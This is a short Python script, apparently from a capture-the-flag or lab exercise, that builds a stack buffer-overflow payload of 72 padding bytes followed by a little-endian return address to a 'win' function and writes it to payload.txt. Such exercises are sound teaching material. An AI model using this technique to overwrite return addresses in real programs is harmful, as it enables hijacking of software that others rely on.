offset = 72
win_address = b"\x50\x15\x40\x00"  # 0x401550 in little endian

payload = b"A" * offset + win_address

with open("payload.txt", "wb") as f:
    f.write(payload)

print(f"[+] Payload written to payload.txt ({len(payload)} bytes)")
